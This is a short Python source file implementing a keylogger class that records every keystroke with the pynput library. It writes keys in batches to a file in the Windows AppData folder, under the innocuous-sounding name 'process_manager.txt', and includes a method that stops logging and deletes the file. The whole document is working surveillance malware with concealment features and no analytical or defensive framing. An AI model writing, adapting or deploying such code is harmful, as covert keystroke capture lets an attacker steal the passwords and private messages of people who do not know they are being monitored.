import os
import pynput


class Keylog:
    def __init__(self):
        self.keys = []
        self.count = 0
        self.path = os.environ['appdata'] + '\\process_manager.txt'
        self.run = 1
        self.listener = None

    def read_file(self):
        with open(self.path, 'rt') as f:
            return f.read()

    def write_data(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 5:
            self.write_data(self.keys)
            self.keys = []
            self.count = 0

    def start(self):
        self.listener = pynput.keyboard.Listener(on_press=self.on_press)

        with self.listener:
            self.listener.join()

    def destruct(self):
        self.run = 0
        self.listener.stop()
        os.remove(self.path)
